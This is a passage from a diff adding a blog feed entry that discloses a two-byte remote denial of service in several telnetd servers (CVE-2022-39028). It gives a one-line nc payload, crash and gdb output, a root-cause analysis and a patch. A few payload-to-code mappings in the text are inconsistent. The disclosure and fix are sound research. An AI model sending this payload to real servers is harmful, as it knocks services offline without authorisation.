@@ -4,6 +4,1136 @@
     <title>IT Security Research by Pierre</title>
     
     <entry>
+        <title>2-byte DoS in freebsd-telnetd / netbsd-telnetd / netkit-telnetd / inetutils-telnetd / telnetd in Kerberos Version 5 Applications - Binary Golf Grand Prix 3 - CVE-2022-39028</title>
+        <link href="2022-08-24-2-byte-dos-freebsd-netbsd-telnetd-netkit-telnetd-inetutils-telnetd-kerberos-telnetd.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>FreeBSD-telnetd, NetBSD-telnetd, netkit-telnetd, telnetd in Kerberos Version 5 Applications and inetutils-telnetd are standard telnet servers used in several Linux distributions, BSD systems, UNIX systems and commercial products:</p>
+<ul>
+<li>FreeBSD, NetBSD</li>
+<li>Debian, Fedora, Gentoo, ArchLinux, ... - using inetutils-telnetd or netkit-telnetd</li>
+<li>specific Palo Alto appliances</li>
+<li>specific Cisco appliances</li>
+<li>specific Brocade appliances</li>
+<li>specific Arista appliances</li>
+<li>OS running telnetd from Kerberos Version 5 Applications: this may include BSD 4.3 Reno, UNICOS 5.1 to UNICOS 7.0, SunOs 3.5 to SunOs 4.1, DYNIX V3.0.17.9 and Ultrix 3.1 to Ultrix 4.0. Note that these OS may be EOL.</li>
+<li>...</li>
+</ul>
+<p>From our understanding, the first implementation containing the vulnerabilities dates from February 1991. This is the Kerberos telnetd implementation available at <a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd</a>.</p>
+<p>This code has been merged into FreeBSD in the 90s. Then netkit-telnetd comes from a very old version of the FreeBSD telnetd. And finally inetutils-telnetd is a fork of netkit-telnetd.</p>
+<p>These vulnerabilities are very old (at least 30 years).</p>
+<p>In all these implementations, the vulnerable part of the code base has not been updated for 30 years and appears not to be maintained anymore.</p>
+<p>A part of the list of affected products was obtained by using <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10188">CVE-2020-10188 (a vulnerability in netkit-telnetd)</a>.
+We can find advisories from <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-telnetd-EFJrEzPx">Cisco</a>, <a href="https://security.paloaltonetworks.com/CVE-2020-10188">Palo Alto</a>, <a href="https://www.broadcom.com/support/fibre-channel-networking/security-advisories/brocade-security-advisory-2021-1013">Brocade</a> and <a href="https://www.arista.com/en/support/advisories-notices/security-advisories/10702-security-advisory-48">Arista</a> referencing CVE-2020-10188 in their products.</p>
+<p>Furthermore, from <a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README</a>, the release date is February 22, 1991 and the supported OS are BSD 4.3 Reno, UNICOS 5.1 to UNICOS 7.0, SunOs 3.5 to SunOs 4.1, DYNIX V3.0.17.9 and Ultrix 3.1 to Ultrix 4.0.
+We can assume these OS running kerberos-telnetd are also vulnerable.</p>
+<p>We wanted to participate to the <a href="https://tmpout.sh/bggp/3/">Binary Golf Grand Prix 3</a> with a fun vulnerability very easy to trigger over the network without authentication and with only 2 bytes.</p>
+<p>The summary is:</p>
+<ol>
+<li><a href="#remote-dos">Details - Remote DoS in FreeBSD telnetd</a><br>
+1.1. <a href="#remote-dos-bonus-points">Bonus points</a><br>
+1.2. <a href="#remote-dos-netkit-telnet-0.17">netkit-telnet-0.17</a><br>
+1.3. <a href="#remote-dos-inetutils">Inetutils</a><br>
+1.4. <a href="#remote-dos-netbsd-telnetd">NetBSD-telnetd</a><br>
+1.5. <a href="#remote-dos-kerberos-telnetd-latest-version">Telnetd in Kerberos Version 5 Applications - latest version</a><br>
+1.6. <a href="#remote-dos-kerberos-telnetd-initial-version">Telnetd in Kerberos Version 5 Applications - initial version</a><br>
+1.7. <a href="#remote-dos-analysis">Analysis of the "normal" execution path</a><br>
+1.8. <a href="#remote-dos-root-cause-analysis">Root cause analysis of the crashes</a><br>
+1.9. <a href="#remote-dos-macos">MacOS</a><br>
+1.10. <a href="#remote-dos-conclusion">Conclusion</a><br></li>
+<li><a href="#permanent-remote-dos">Details - permanent Remote DoS</a></li>
+<li><a href="#full-disclosure">Vendor Response</a></li>
+<li><a href="#recommendations">Recommendations</a></li>
+<li><a href="#bggp3-score">BGGP #3 Score</a></li>
+<li><a href="#credits">Credits</a></li>
+<li><a href="#references">References</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+</ol>
+<p><a id="remote-dos"></a></p>
+<h2>Details - Remote DoS in FreeBSD telnetd</h2>
+<p>It is possible to remotely crash the "standard" FreeBSD telnetd server by sending 2 bytes (<code>\xff\xf7</code>) from the network, as shown below:</p>
+<pre><code>kali% printf "\xff\xf7" | nc -n -v 192.168.1.200 23
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+&lt;FF&gt;&lt;FD&gt;%
+kali%
+</code></pre>
+<p>And we can confirm the remote telnetd server running on a FreeBSD 13.1 machine crashed:</p>
+<pre><code>freebsd-13-1p1# echo "telnet stream  tcp     nowait  root    /usr/libexec/telnetd    telnetd" &gt;&gt; /etc/inetd.conf
+freebsd-13-1p1# /etc/rc.d/inetd onestart
+Starting inetd.
+freebsd-13-1p1# echo "waiting for the PoC..."
+waiting for the PoC...
+[...]
+freebsd-13-1p1# dmesg | tail -n 1
+pid 785 (telnetd), jid 0, uid 0: exited on signal 11 (core dumped)
+</code></pre>
+<p>A working variant exists with <code>\xff\xf8</code>. The vulnerable code is located 2 lines under the first vulnerability in the source code.</p>
+<pre><code>kali% printf "\xff\xf7" | nc -n -v 192.168.1.200 23
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+&lt;FF&gt;&lt;FD&gt;%
+kali%
+</code></pre>
+<p>Debugging with FreeBSD:</p>
+<pre><code>freebsd-13-1p1# freebsd-update fetch
+Looking up update.FreeBSD.org mirrors... 2 mirrors found.
+Fetching metadata signature for 13.1-RELEASE from update2.freebsd.org... done.
+Fetching metadata index... done.
+Inspecting system... done.
+Preparing to download files... done.
+Fetching 7 patches.... done.
+Applying patches... done.
+freebsd-13-1p1# freebsd-update install
+Creating snapshot of existing boot environment... done.
+Installing updates...Scanning //usr/share/certs/blacklisted for certificates...
+Scanning //usr/share/certs/trusted for certificates...
+ done.
+freebsd-13-1p1#
+freebsd-13-1p1# cd /tmp
+freebsd-13-1p1# fetch https://download.freebsd.org/ftp/releases/amd64/13.1-RELEASE/src.txz
+src.txz                                                183 MB 6208 kBps    31s
+freebsd-13-1p1# tar -C / -xvf src.txz
+...
+x usr/src/secure/caroot/blacklisted/GeoTrust_Primary_Certification_Authority_-_G3.pem
+x usr/src/secure/caroot/blacklisted/Camerfirma_Chambers_of_Commerce_Root.pem
+x usr/src/secure/caroot/blacklisted/Trustis_FPS_Root_CA.pem
+freebsd-13-1p1# cat &lt;&lt;EOF &gt; /etc/make.conf
+CFLAGS=-pipe
+WITH_CTF=1
+DEBUG_FLAGS=-g
+EOF
+freebsd-13-1p1# cd /usr/src/lib/libtelnet &amp;&amp; make obj &amp;&amp; make depend &amp;&amp; make &amp;&amp; make install
+cc  -pipe -fno-common   -I/usr/src/contrib/telnet -DENCRYPTION -DAUTHENTICATION -DSRA -DKRB5 -DFORWARD -Dnet_write=telnet_net_write -g -MD  -MF.depend.genget.o -MTgenget.o -std=gnu99 -Wno-format-zero-length -fstack-protector-strong -Wsystem-headers -Werror -Wall -Wno-format-y2k -Wno-uninitialized -Wno-pointer-sign -Wno-empty-body -Wno-string-plus-int -Wno-unused-const-variable -Wno-error=unused-but-set-variable -Wno-tautological-compare -Wno-unused-value -Wno-parentheses-equality -Wno-unused-function -Wno-enum-conversion -Wno-unused-local-typedef -Wno-address-of-packed-member -Wno-switch -Wno-switch-enum -Wno-knr-promoted-parameter  -Qunused-arguments    -c /usr/src/contrib/telnet/libtelnet/genget.c -o genget.o
+...
+freebsd-13-1p1# cd /usr/src/libexec/telnetd &amp;&amp; make obj &amp;&amp; make depend &amp;&amp; make &amp;&amp; make install
+...
+install -o root -g wheel -m 555 telnetd /usr/libexec/telnetd
+install -o root -g wheel -m 444 telnetd.debug /usr/lib/debug/usr/libexec/telnetd.debug
+install -o root -g wheel -m 444 telnetd.8.gz  /usr/share/man/man8/
+</code></pre>
+<p>The <code>telnetd</code> program will be compiled without optimization and with debug information (<code>-g</code>).</p>
+<p>Sending the payload from a Kali Linux:</p>
+<pre><code>kali% (sleep 10 ; printf "\xff\xf7") | nc -n -v 192.168.1.200 23
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+&lt;FF&gt;&lt;FD&gt;%
+</code></pre>
+<p>And debugging with gdb on FreeBSD:</p>
+<pre><code>freebsd-13-1p1# ps -auxww | grep telnetd
+root  4430   0.0  0.1 19016 7400  -  Ss   08:58     0:00.01 telnetd
+root  4432   0.0  0.0 12840 2316  0  R+   08:58     0:00.00 grep telnetd
+freebsd-13-1p1# gdb -p 4430
+GNU gdb (GDB) 12.1 [GDB v12.1 for FreeBSD]
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-portbld-freebsd13.0".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+Attaching to process 4430
+Reading symbols from /usr/libexec/telnetd...
+Reading symbols from /usr/lib/debug//usr/libexec/telnetd.debug...
+
+warning: Could not load shared library symbols for [vdso].
+Do you need "set solib-search-path" or "set sysroot"?
+Reading symbols from /lib/libutil.so.9...
+(No debugging symbols found in /lib/libutil.so.9)
+Reading symbols from /lib/libncursesw.so.9...
+(No debugging symbols found in /lib/libncursesw.so.9)
+Reading symbols from /usr/lib/libmp.so.7...
+(No debugging symbols found in /usr/lib/libmp.so.7)
+Reading symbols from /lib/libcrypto.so.111...
+(No debugging symbols found in /lib/libcrypto.so.111)
+Reading symbols from /usr/lib/libpam.so.6...
+(No debugging symbols found in /usr/lib/libpam.so.6)
+Reading symbols from /usr/lib/libkrb5.so.11...
+(No debugging symbols found in /usr/lib/libkrb5.so.11)
+Reading symbols from /usr/lib/libroken.so.11...
+(No debugging symbols found in /usr/lib/libroken.so.11)
+Reading symbols from /lib/libc.so.7...
+(No debugging symbols found in /lib/libc.so.7)
+Reading symbols from /lib/libthr.so.3...
+(No debugging symbols found in /lib/libthr.so.3)
+Reading symbols from /usr/lib/libasn1.so.11...
+(No debugging symbols found in /usr/lib/libasn1.so.11)
+Reading symbols from /usr/lib/libcom_err.so.5...
+(No debugging symbols found in /usr/lib/libcom_err.so.5)
+Reading symbols from /lib/libcrypt.so.5...
+(No debugging symbols found in /lib/libcrypt.so.5)
+Reading symbols from /usr/lib/libhx509.so.11...
+(No debugging symbols found in /usr/lib/libhx509.so.11)
+Reading symbols from /usr/lib/libwind.so.11...
+(No debugging symbols found in /usr/lib/libwind.so.11)
+Reading symbols from /usr/lib/libheimbase.so.11...
+(No debugging symbols found in /usr/lib/libheimbase.so.11)
+Reading symbols from /usr/lib/libprivateheimipcc.so.11...
+(No debugging symbols found in /usr/lib/libprivateheimipcc.so.11)
+Reading symbols from /libexec/ld-elf.so.1...
+(No debugging symbols found in /libexec/ld-elf.so.1)
+[Switching to LWP 100331 of process 4430]
+0x00000008015e76b8 in _read () from /lib/libc.so.7
+(gdb) b telrcv
+Breakpoint 1 at 0x102be98: file /usr/src/contrib/telnet/telnetd/state.c, line 96.
+(gdb) c
+Continuing.
+
+Breakpoint 1, telrcv () at /usr/src/contrib/telnet/telnetd/state.c:96
+96      while (ncc &gt; 0) {
+(gdb) n
+97          if ((&amp;ptyobuf[BUFSIZ] - pfrontp) &lt; 2)
+(gdb) 
+99          c = *netip++ &amp; 0377, ncc--;
+(gdb) 
+101         if (decrypt_input)
+(gdb) 
+104         switch (state) {
+(gdb) 
+115             if (c == IAC) {     // [1] IAC = 255 = 0xff. this is the first character we sent
+(gdb) 
+116                 state = TS_IAC; // [2] the state variable becomes TS_IAC
+(gdb) 
+117                 break;
+(gdb) 
+96      while (ncc &gt; 0) {
+(gdb)
+
+Breakpoint 1, telrcv () at /usr/src/contrib/telnet/telnetd/state.c:96
+96      while (ncc &gt; 0) {
+(gdb) 
+97          if ((&amp;ptyobuf[BUFSIZ] - pfrontp) &lt; 2)
+(gdb) 
+99          c = *netip++ &amp; 0377, ncc--;
+(gdb) 
+101         if (decrypt_input)
+(gdb) 
+104         switch (state) {
+(gdb) 
+159 gotiac:         switch (c) {
+          /* we reach line 159, thanks to the line 158 shown in the next C listing:
+             the state variable is checked against TS_IAC (defined in the previous loop) */
+(gdb) 
+220                 DIAG(TD_OPTIONS,
+
+(gdb) 
+222                 ptyflush(); /* half-hearted */
+(gdb) 
+223                 init_termbuf();
+(gdb) 
+224                 if (c == EC)
+(gdb) 
+225                     ch = *slctab[SLC_EC].sptr;
+(gdb)
+
+Program received signal SIGSEGV, Segmentation fault.
+Address not mapped to object.
+0x000000000102c2af in telrcv () at /usr/src/contrib/telnet/telnetd/state.c:225
+225                     ch = *slctab[SLC_EC].sptr;
+(gdb) bt
+#0  0x000000000102c2af in telrcv () at /usr/src/contrib/telnet/telnetd/state.c:225
+#1  0x0000000001033383 in ttloop () at /usr/src/contrib/telnet/telnetd/utility.c:84
+#2  0x0000000001030ff7 in getterminaltype (name=0x1045000 &lt;user_name&gt; "") at /usr/src/contrib/telnet/telnetd/telnetd.c:481
+#3  0x0000000001030dff in doit (who=0x7fffffffe928) at /usr/src/contrib/telnet/telnetd/telnetd.c:715
+#4  0x0000000001030b46 in main (argc=0, argv=0x7fffffffea30) at /usr/src/contrib/telnet/telnetd/telnetd.c:408
+(gdb) p ch
+$1 = 0 '\000'
+(gdb) p slctab[10]
+$2 = {defset = {flag = 0 '\000', val = 0 '\000'}, current = {flag = 0 '\000', val = 0 '\000'}, sptr = 0x0}
+(gdb) p slctab[10].sptr 
+$3 = (cc_t *) 0x0
+(gdb) p *(slctab[10].sptr)
+Cannot access memory at address 0x0
+</code></pre>
+<p>We can see 2 loops in gdb, each for one character.</p>
+<p>And the crash is a null pointer dereference.</p>
+<p><code>SLC_EC</code> is defined in  <code>usr/src/contrib/telnet/arpa/telnet.h</code>:</p>
+<pre><code>193 #define SLC_SUSP        9
+194 #define SLC_EC          10
+195 #define SLC_EL          11
+</code></pre>
+<p>When reading the <code>/usr/src/contrib/telnet/telnetd/state.c</code> file, we can find the vulnerable lines 225 and 227:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">91</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>)
+ <span style="color: #666666">92</span> {
+ <span style="color: #666666">93</span>         <span style="color: #B00040">int</span> c;
+ <span style="color: #666666">94</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+ <span style="color: #666666">95</span> 
+ <span style="color: #666666">96</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
+ <span style="color: #666666">97</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
+ <span style="color: #666666">98</span>                         <span style="color: #008000; font-weight: bold">break</span>;
+ <span style="color: #666666">99</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
+<span style="color: #666666">100</span> <span style="border: 1px solid #FF0000">#</span>ifdef  ENCRYPTION
+<span style="color: #666666">101</span>                 <span style="color: #008000; font-weight: bold">if</span> (decrypt_input)
+<span style="color: #666666">102</span>                         c <span style="color: #666666">=</span> (<span style="color: #666666">*</span>decrypt_input)(c);
+<span style="color: #666666">103</span> <span style="border: 1px solid #FF0000">#</span>endif  <span style="color: #408080; font-style: italic">/* ENCRYPTION */</span>
+<span style="color: #666666">104</span>                 <span style="color: #008000; font-weight: bold">switch</span> (state) {
+...
+<span style="color: #666666">158</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:  <span style="color: #408080; font-style: italic">// in the second loop, state is TS_IAC,</span>
+                                  <span style="color: #408080; font-style: italic">// from [2], we continue the execution flow there</span>
+<span style="color: #666666">159</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) { <span style="color: #408080; font-style: italic">// testing the current character</span>
+...
+<span style="color: #666666">211</span>                         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">212                          * Erase Character and</span>
+<span style="color: #408080; font-style: italic">213                          * Erase Line</span>
+<span style="color: #408080; font-style: italic">214                          */</span>
+<span style="color: #666666">215</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>: <span style="color: #408080; font-style: italic">// is the current character 247 (0xf7)?</span>
+<span style="color: #666666">216</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>: <span style="color: #408080; font-style: italic">// is the current character 248 (0xf8)?</span>
+<span style="color: #666666">217</span>                             {
+<span style="color: #666666">218</span>                                 cc_t ch;
+<span style="color: #666666">219</span> 
+<span style="color: #666666">220</span>                                 DIAG(TD_OPTIONS,
+<span style="color: #666666">221</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">222</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">223</span>                                 init_termbuf();
+<span style="color: #666666">224</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">225</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">226</span>                                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">227</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">228</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">229</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">230</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">231</span>                             }
+</pre></div>
+
+<p>In the code, <code>EC</code> corresponds to <code>247</code> (<code>\xf7</code>) and <code>EL</code> corresponds to <code>248</code> (<code>\xf8</code>):</p>
+<p>They are defined in <code>/usr/src/contrib/telnet/arpa/telnet.h</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">39</span> <span style="border: 1px solid #FF0000">#</span>define IAC     <span style="color: #666666">255</span>             <span style="color: #408080; font-style: italic">/* interpret as command: */</span>
+...
+<span style="color: #666666">46</span> <span style="border: 1px solid #FF0000">#</span>define EL      <span style="color: #666666">248</span>             <span style="color: #408080; font-style: italic">/* erase the current line */</span>
+<span style="color: #666666">47</span> <span style="border: 1px solid #FF0000">#</span>define EC      <span style="color: #666666">247</span>             <span style="color: #408080; font-style: italic">/* erase the current character */</span>
+</pre></div>
+
+<p>So we have this code executed when sending the payload <code>\xff\xf8</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;
+</pre></div>
+
+<p>or this code executed when sending the payload <code>\xff\xf7</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;
+</pre></div>
+
+<p>Using gdb, we can see that <code>slctab[10].sptr</code> (<code>slctab[SLC_EC].sptr</code>) and <code>slctab[11].sptr</code> (<code>slctab[SLC_EL].sptr</code>) are set to <code>NULL</code> (<code>0x0</code>) so the value at the <code>NULL</code> address is unreachable.</p>
+<p>We can modify the function by checking the pointers. This change will remove the previous security vulnerabilities:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">211</span>                         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">212                          * Erase Character and</span>
+<span style="color: #408080; font-style: italic">213                          * Erase Line</span>
+<span style="color: #408080; font-style: italic">214                          */</span>
+<span style="color: #666666">215</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">216</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">217</span>                             {
+<span style="color: #666666">218</span>                                 cc_t ch <span style="color: #666666">=</span> (cc_t)_POSIX_VDISABLE;
+<span style="color: #666666">219</span>
+<span style="color: #666666">220</span>                                 <span style="color: #0000FF">DIAG</span>(TD_OPTIONS,
+<span style="color: #666666">221</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">222</span>                                 <span style="color: #0000FF">ptyflush</span>();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">223</span>                                 <span style="color: #0000FF">init_termbuf</span>();
+<span style="color: #666666">224</span>                                 <span style="color: #0000FF">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">225</span>                                 {
+<span style="color: #666666">226</span>                                         <span style="color: #008000; font-weight: bold">if</span> (slctab[SLC_EC].sptr)
+<span style="color: #666666">227</span>                                                 ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;
+<span style="color: #666666">228</span>                                 }
+<span style="color: #666666">229</span>                                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">230</span>                                 {
+<span style="color: #666666">231</span>                                         <span style="color: #008000; font-weight: bold">if</span> (slctab[SLC_EL].sptr)
+<span style="color: #666666">232</span>                                                 ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;
+<span style="color: #666666">233</span>                                 }
+<span style="color: #666666">234</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">235</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">236</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">237</span>                             }
+</pre></div>
+
+<p>The resulting patch is:</p>
+<pre><code>freebsd-13-1p1# diff -u -p ./usr/src/contrib/telnet/telnetd/state.c /usr/src/contrib/telnet/telnetd/state.c
+--- ./usr/src/contrib/telnet/telnetd/state.c    2022-05-12 05:53:58.000000000 +0100
++++ /usr/src/contrib/telnet/telnetd/state.c 2022-08-21 09:41:09.699357000 +0100
+@@ -215,16 +215,22 @@ gotiac:           switch (c) {
+            case EC:
+            case EL:
+                {
+-               cc_t ch;
++               cc_t ch = (cc_t)_POSIX_VDISABLE;
+
+                DIAG(TD_OPTIONS,
+                    printoption("td: recv IAC", c));
+                ptyflush(); /* half-hearted */
+                init_termbuf();
+                if (c == EC)
+-                   ch = *slctab[SLC_EC].sptr;
++               {
++                   if (slctab[SLC_EC].sptr)
++                       ch = *slctab[SLC_EC].sptr;
++               }
+                else
+-                   ch = *slctab[SLC_EL].sptr;
++               {
++                   if (slctab[SLC_EL].sptr)
++                       ch = *slctab[SLC_EL].sptr;
++               }
+                if (ch != (cc_t)(_POSIX_VDISABLE))
+                    *pfrontp++ = (unsigned char)ch;
+                break;
+freebsd-13-1p1#
+</code></pre>
+<p>We tested the patch and it works.</p>
+<p><a id="remote-dos-bonus-points"></a></p>
+<h3>Bonus points</h3>
+<p>Telnet supports secure mode. This mode is also vulnerable in FreeBSD as shown below:</p>
+<p><code>/usr/src/crypto/heimdal/appl/telnet/telnetd/state.c</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">79</span> <span style="color: #B00040">void</span>
+ <span style="color: #666666">80</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>)
+ <span style="color: #666666">81</span> {
+ <span style="color: #666666">82</span>     <span style="color: #B00040">int</span> c;
+ <span style="color: #666666">83</span>     <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+ <span style="color: #666666">84</span>
+ <span style="color: #666666">85</span>     <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {  
+ <span style="color: #666666">86</span>         <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
+ <span style="color: #666666">87</span>             <span style="color: #008000; font-weight: bold">break</span>;
+ <span style="color: #666666">88</span>         c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
+ <span style="color: #666666">89</span> <span style="border: 1px solid #FF0000">#</span>ifdef ENCRYPTION
+ <span style="color: #666666">90</span>         <span style="color: #008000; font-weight: bold">if</span> (decrypt_input)
+ <span style="color: #666666">91</span>             c <span style="color: #666666">=</span> (<span style="color: #666666">*</span>decrypt_input)(c);
+ <span style="color: #666666">92</span> <span style="border: 1px solid #FF0000">#</span>endif
+ <span style="color: #666666">93</span>         <span style="color: #008000; font-weight: bold">switch</span> (state) {
+...
+<span style="color: #666666">189</span>         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">190          * Erase Character and</span>
+<span style="color: #408080; font-style: italic">191          * Erase Line</span>
+<span style="color: #408080; font-style: italic">192          */</span>
+<span style="color: #666666">193</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">194</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">195</span>             {
+<span style="color: #666666">196</span>                 cc_t ch;
+<span style="color: #666666">197</span> 
+<span style="color: #666666">198</span>                 DIAG(TD_OPTIONS,
+<span style="color: #666666">199</span>                      printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">200</span>                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">201</span>                 init_termbuf();
+<span style="color: #666666">202</span>                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">203</span>                     ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">204</span>                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">205</span>                     ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">206</span>                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">207</span>                     <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">208</span>                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">209</span>             }
+</pre></div>
+
+<p><a id="remote-dos-netkit-telnet-0.17"></a></p>
+<h3>netkit-telnet-0.17</h3>
+<p>The same behavior can be observed with netkit-telnet-0.17 under Linux, while sending the same payloads (<code>\xff\xf7</code> or <code>\xff\xf8</code>):</p>
+<pre><code>gentoo% (sleep 10 ; printf "\xff\xf7") | nc -n -v localhost 23
+</code></pre>
+<p>And debugging with gdb on Gentoo:</p>
+<pre><code>gentoo% gdb -p `pidof in.telnetd`
+GNU gdb (Gentoo 11.2 vanilla) 11.2
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;https://bugs.gentoo.org/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+Attaching to process 20328
+Reading symbols from /usr/sbin/telnetd...
